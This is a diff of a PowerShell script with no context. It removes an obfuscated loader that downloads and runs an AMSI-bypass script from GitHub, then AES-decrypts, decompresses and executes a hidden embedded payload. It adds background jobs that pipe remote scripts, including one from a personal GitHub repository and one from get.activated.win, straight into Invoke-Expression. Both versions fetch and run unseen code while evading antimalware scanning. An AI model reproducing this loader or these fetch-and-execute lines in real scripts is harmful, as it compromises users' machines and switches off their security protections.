@@ -1,19 +1,16 @@
-([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x
-$FavQY4k = [cOnvert]::frOMbASe64striNg("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")
-$U2VbL1s = [CoNVerT]::froMbase64STRing("9team2e+gEkF+jNAkNe0m2/yDnyViaBh0y72tyxbZoI=")
-$t2cAhA = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"
-$t2cAhA.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::CbC
-$t2cAhA.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::ZeROs
-$t2cAhA.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)
-$t2cAhA.kEysIZe = ((10+166-20*2)+(97)+(12+11))
-$t2cAhA.Key = $U2VbL1s
-$t2cAhA.Iv = $FavQY4k[0..15]
-$xSwaicY = &(GCM *w-o*t) System.IO.MemoryStream
-$NLIERH0 = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,$t2cAhA.CreAteDecRYpToR().tRANsFOrMFiNALbLocK($FavQY4k,16,$FavQY4k.Length-16))
-$Ywc0CE = &(GCM *w-o*t) SYSTEm.iO.compressiOn.GzipSTrEAm $NLIERH0, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)
-$Ywc0CE.CopyTo($xSwaicY)
-$Ywc0CE.CLoSe()
-$CQ0kiJo = [TeXT.EnCOdInG]::UtF8.GetStriNG($xSwaicY.tOARRAY())
-$t2cAhA.dISPOsE()
-$NLIERH0.Close()
-I`e`X($CQ0kiJo)
+
+$job1 = Start-Job -ScriptBlock {
+    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/ev.ps1" | Invoke-Expression
+}
+
+Wait-Job $job1
+Receive-Job $job1
+
+$job2 = Start-Job -ScriptBlock {
+    Invoke-RestMethod -Uri "https://get.activated.win" | Invoke-Expression
+}
+
+Wait-Job $job2
+Receive-Job $job2
+
+
